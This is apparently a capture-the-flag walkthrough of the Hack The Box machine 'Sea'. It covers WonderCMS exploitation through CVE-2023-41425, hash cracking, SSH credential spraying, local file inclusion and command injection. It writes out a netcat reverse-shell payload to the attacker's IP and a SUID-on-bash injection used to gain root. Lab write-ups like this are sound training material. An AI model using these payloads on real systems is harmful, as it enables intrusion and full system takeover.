---
icon: ubuntu
---

# Sea - Easy

<figure><img src="../../.gitbook/assets/image (3320).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/sea"><strong>Sea</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scaning & Enumeration</mark>

{% code title="Nmap TCP scan" overflow="wrap" expandable="true" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.10.234 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 10:09 -0400
Nmap scan report for 10.129.10.234
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   27.14 ms 10.10.16.1
2   58.56 ms 10.129.10.234
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

{% code title="curl -I http://10.129.10.234/" overflow="wrap" expandable="true" %}
```shellscript
HTTP/1.0 200 OK
Date: Sun, 22 Mar 2026 14:17:19 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=1vsukgqisuh6biacpckg1cuc34; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
```
{% endcode %}

An apache server running php

#### <mark style="color:$primary;">Website</mark>

<figure><img src="../../.gitbook/assets/image (3321).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3329).png" alt=""><figcaption></figcaption></figure>

I'll add this domain name to my hosts file

<figure><img src="../../.gitbook/assets/image (3330).png" alt=""><figcaption></figcaption></figure>

Nothing much else to see on the site

#### <mark style="color:$primary;">Directory Busting</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
feroxbuster -u http://10.129.10.234 -n
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3322).png" alt=""><figcaption></figcaption></figure>

I am going to further investigate the themes folder

{% code overflow="wrap" expandable="true" %}
```shellscript
feroxbuster -u http://10.129.10.234/themes
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3323).png" alt=""><figcaption></figcaption></figure>

I found a couple of interesting endpoints let's check the out

<figure><img src="../../.gitbook/assets/image (3324).png" alt=""><figcaption></figcaption></figure>

We got a version number that is good but we need to find out what is running

Next I checked the license for some possible clues

<figure><img src="../../.gitbook/assets/image (3325).png" alt=""><figcaption></figcaption></figure>

A quick google search and we find WonderCMS

<figure><img src="../../.gitbook/assets/image (3326).png" alt=""><figcaption></figcaption></figure>

next I searched for wondercms 3.2.0 exploit

### <mark style="color:blue;">SSRF CVE-2023-41425 wonderCMS\_RCE</mark>

{% embed url="https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE" %}

I came across this repo offering a POC and explaining how to exploit his version of WonderCMS

* First clone the repo

{% code overflow="wrap" expandable="true" %}
```shellscript
git clone https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE.git
```
{% endcode %}

* Second step execute the script&#x20;

{% code overflow="wrap" expandable="true" %}
```shellscript
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.16.63 -lport 443 -sport 8000
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3335).png" alt=""><figcaption></figcaption></figure>

* Third step setup a listener on port 443

<figure><img src="../../.gitbook/assets/image (3336).png" alt=""><figcaption></figcaption></figure>

* Step 4 Copy the given link and paste it in the website section of the contact form

<figure><img src="../../.gitbook/assets/image (3337).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3338).png" alt=""><figcaption></figcaption></figure>

Now wait a couple of minutes for the admin user to access the link and you will get a shell on your listener

<figure><img src="../../.gitbook/assets/image (3339).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as www-data</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3340).png" alt=""><figcaption></figcaption></figure>

Besides root there are 2 more users with shell access on this box. This might be a hint to some possible stored credentials in some config file

<figure><img src="../../.gitbook/assets/image (3305).png" alt=""><figcaption></figcaption></figure>

Discovered a password hash in the `database.js` file in `/var/www/sea/data`

The hash contains 2 backslashes -> `\` that are escaping -> `/` so I will remove them

{% code overflow="wrap" expandable="true" %}
```shellscript
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```
{% endcode %}

Now I will try to crack this hash using john

{% code overflow="wrap" expandable="true" %}
```shellscript
john hash -w=/usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3306).png" alt=""><figcaption></figcaption></figure>

I am going to test this password against the users I discovered earlier

### <mark style="color:blue;">Credential Spraying</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
netexec ssh sea.htb -u users -p mychemicalromance --continue-on-success
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3307).png" alt=""><figcaption></figcaption></figure>

We can ssh as amay!

{% code overflow="wrap" expandable="true" %}
```shellscript
ssh amay@sea.htb
```
{% endcode %}

### <mark style="color:blue;">Shell as amay</mark>

<figure><img src="../../.gitbook/assets/image (3308).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Manual Enumeration</mark>

Amay can't do much on the machine, but I did find some ports listening on localhost

<figure><img src="../../.gitbook/assets/image (3309).png" alt=""><figcaption></figcaption></figure>

I'll setup a tunnel and check out port 8080 on my machine

### <mark style="color:blue;">SSH Port Forwarding</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
ssh amay@sea.htb -L 8000:localhost:8080
```
{% endcode %}

After running the thunel we see the site on our machine

<figure><img src="../../.gitbook/assets/image (3310).png" alt=""><figcaption></figcaption></figure>

there is a sign in prompt I will try amay's creds. Which work!

<figure><img src="../../.gitbook/assets/image (3311).png" alt=""><figcaption></figcaption></figure>

Let's check the requests in Burp and see what is happening. Clicking the Analyze button&#x20;

<figure><img src="../../.gitbook/assets/image (3312).png" alt=""><figcaption></figcaption></figure>

The exact file path is passed in the variable. Let's check for LFI, I'll modify the log\_file variable to point to `/etc/passwd`

<figure><img src="../../.gitbook/assets/image (3313).png" alt=""><figcaption></figcaption></figure>

It works, even though we did not get the full /etc/passwd file. Nothing much we can do with this, we can try and check for Command Injection.

### <mark style="color:blue;">Command Injection</mark>

{% code overflow="wrap" expandable="true" %}
```shellscript
;+sleep+2
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3314).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3315).png" alt=""><figcaption></figcaption></figure>

The response took 2 seconds! Command Injection Confirmed. Let's try and get a reverse shell

{% code overflow="wrap" expandable="true" %}
```shellscript
;busybox+nc+10.10.16.63+443+-e+/bin/sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3316).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3317).png" alt=""><figcaption></figcaption></figure>

we do get a shell as the root user, but it dies in like 2 seconds! Since we know root is running this process, we can have it set the SUID on /bin/bash for an easier privesc

{% code overflow="wrap" expandable="true" %}
```shellscript
;chmod%204777%20/bin/bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3318).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3319).png" alt=""><figcaption></figcaption></figure>

it worked we got a shell as the root user.
